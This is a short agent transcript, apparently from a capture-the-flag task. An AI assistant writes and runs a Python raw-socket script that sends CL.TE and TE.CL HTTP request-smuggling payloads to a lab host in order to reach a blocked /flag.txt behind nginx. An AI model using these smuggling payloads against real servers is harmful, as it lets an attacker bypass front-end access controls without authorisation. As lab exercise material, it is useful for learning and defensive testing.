content: The stack is nginx 1.17.6 in front of an Express app, and `/flag.txt` redirects. That suggests the front end blocks direct access to the flag, so I'll test for request smuggling with raw sockets. First a CL.TE probe, then a TE.CL probe.

tool_calls.name: run_shell
tool_calls.arguments:
{"command": "cat > /tmp/s.py <<'EOF'
import socket,sys
def send(raw):
    s=socket.create_connection(("target",3009),timeout=5)
    s.sendall(raw.encode())
    data=b""
    try:
        while True:
            c=s.recv(4096)
            if not c: break
            data+=c
    except Exception: pass
    return data.decode(errors="replace")
# CL.TE probe: front uses CL, back uses TE
body="0\r\n\r\nGET /flag.txt HTTP/1.1\r\nHost: localhost\r\nX-Ignore: x"
clte=("POST / HTTP/1.1\r\nHost: target\r\nContent-Type: application/x-www-form-urlencoded\r\n"
      f"Content-Length: {len(body)}\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n"+body)
print("=== CL.TE ===");print(send(clte)[:1500])
# TE.CL probe
body2="5c\r\nGET /flag.txt HTTP/1.1\r\nHost: localhost\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n"
tecl=("POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n"+body2)
print("=== TE.CL ===");print(send(tecl)[:1500])
EOF
python3 /tmp/s.py"}
